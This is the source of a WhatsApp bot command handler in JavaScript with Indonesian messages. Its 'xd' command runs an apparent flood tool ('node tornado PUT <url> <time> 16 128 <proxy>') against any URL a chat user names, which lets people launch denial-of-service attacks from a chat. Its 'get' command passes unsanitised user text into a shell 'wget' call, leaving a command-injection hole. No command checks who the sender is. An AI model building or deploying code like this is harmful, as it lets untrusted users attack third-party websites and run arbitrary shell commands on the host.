const { exec } = require("child_process");

module.exports = async (x, msg, store) => {
  const type = Object.keys(msg.message)[0];
  const body = type === "conversation"
    ? msg.message.conversation
    : type === "extendedTextMessage"
    ? msg.message.extendedTextMessage.text
    : type === "imageMessage"
    ? msg.message.imageMessage.caption
    : type === "videoMessage"
    ? msg.message.videoMessage.caption
    : "";
  const prefix = /^[°π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/.test(body)
    ? body.match(/^[°π÷×¶∆£¢€¥®™✓_=|~!?#$%^&.+-,\/\\©^]/gi)
    : "#";
  const isCmd = body.startsWith(prefix);
  const command = isCmd
    ? body.slice(prefix.length).trim().split(" ").shift().toLowerCase()
    : "";
  const args = isCmd ? body.slice(prefix.length).trim().split(" ").slice(1) : [];
  const from = msg.key.remoteJid;

  if (isCmd) {
    console.log(
      require("chalk").black(require("chalk").bgGreen(`Command ${prefix + command} `)),
      require("chalk").black(require("chalk").bgWhite(`Dari ${msg.pushName}`))
    );
  }

  const reply = (teks) => {
    x.sendMessage(from, { text: teks }, { quoted: msg });
  };

  switch (command) {
    case "tes": {
      reply("On Kak!!!");
      break;
    }
    case "xd": {
      if (args.length < 3) {
        reply("Format salah! Gunakan: xd <url> <time> <proxy>");
        return;
      }
      const [url, time, proxy] = args;

      // Jalankan perintah dengan child_process
      const cmd = `node tornado PUT ${url} ${time} 16 128 ${proxy}`;
      exec(cmd, (error, stdout, stderr) => {
        if (error) {
          reply(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          reply(`Stderr: ${stderr}`);
          return;
        }
        reply(`Output:\n${stdout}`);
      });
      break;
    }
    case "get": {
      if (args.length < 1) {
        reply("Format salah! Gunakan: get <url>");
        return;
      }
      const url = args[0];

      // Jalankan perintah wget
      const cmd = `wget ${url}`;
      exec(cmd, (error, stdout, stderr) => {
        if (error) {
          reply(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          reply(`Stderr: ${stderr}`);
          return;
        }
        reply(`File berhasil diunduh dari ${url}.`);
      });
      break;
    }
    default: {
      if (isCmd) reply(`Command ${command} tidak dikenal!`);
    }
  }
};
